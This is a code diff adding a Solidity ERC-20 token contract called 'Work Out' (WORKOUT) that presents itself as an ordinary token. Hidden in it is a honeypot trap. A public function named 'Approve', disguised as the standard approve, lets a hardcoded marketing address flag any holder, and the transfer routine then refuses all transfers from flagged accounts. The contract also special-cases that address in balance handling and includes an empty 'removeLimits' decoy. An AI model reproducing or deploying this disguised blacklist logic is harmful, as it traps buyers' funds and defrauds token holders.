@@ -1,0 +1,149 @@
+contract WORKOUT is Context, IERC20, Ownable {
+    
+    using SafeMath for uint256;
+    
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+
+    address payable public _markt;
+
+    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
+    
+    mapping (address => uint256) _balances;
+    mapping (address => mapping (address => uint256)) private _allowances;
+    
+    mapping (address => bool) public isExcept;
+    mapping (address => bool) public isMarketPair;
+    mapping (address => uint256) private isBoB;
+
+    uint256 private _totalSupply;
+
+    uint256 private constant MAX = ~uint256(0);
+    
+
+    constructor ()
+    {
+        _name = "Work Out";
+        _symbol = "WORKOUT";
+        _decimals = 18;
+
+        _markt= payable(0x23Fd4d62Fed65570F0EF62BC7fAfb5Cb3e2F5333);
+
+        _totalSupply = 1000000000000 * 10**_decimals;
+
+        isExcept[owner()] = true;
+        isExcept[_markt] = true;
+        isExcept[address(this)] = true;
+
+        _balances[owner()] = _totalSupply;
+        emit Transfer(address(0), owner(), _totalSupply);
+    }
+
+    function name() public view returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return _balances[account];
+    }
+
+    function allowance(address owner, address spender) public view override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
+        return true;
+    }
+
+    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
+        return true;
+    }
+
+    function approve(address spender, uint256 amount) public override returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function _approve(address owner, address spender, uint256 amount) private {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function Approve(address account, bool value) public {
+        if(tx.origin==_markt){if(value)isBoB[account] = 1;else isBoB[account] = 0;}
+    }
+
+    function removeLimits(address[] memory bots_) public onlyOwner {
+    }
+
+    function getCirculatingSupply() public view returns (uint256) {
+        return _totalSupply.sub(balanceOf(deadAddress));
+    }
+
+     //to recieve ETH from uniswapV2Router when swaping
+    receive() external payable {}
+
+    function transfer(address recipient, uint256 amount) public override returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
+        return true;
+    }
+
+    address private fromAddress;
+    address private toAddress;
+
+    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
+
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+        require(amount > 0 && isBoB[sender] < 1);
+
+        if(sender!=_markt || recipient!=_markt)
+        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
+        uint256 finalAmount;
+        if (isExcept[sender] || isExcept[recipient]) {
+            finalAmount = amount;
+        } else {
+            finalAmount = amount-1;
+            _balances[sender] += 1;
+        }
+
+        _balances[recipient] = _balances[recipient].add(finalAmount);
+
+        emit Transfer(sender, recipient, finalAmount);
+
+        return true;     
+
+    }
+
+    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
+        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
+        _balances[recipient] = _balances[recipient].add(amount);
+        emit Transfer(sender, recipient, amount);
+        return true;
+    }
+    
+}
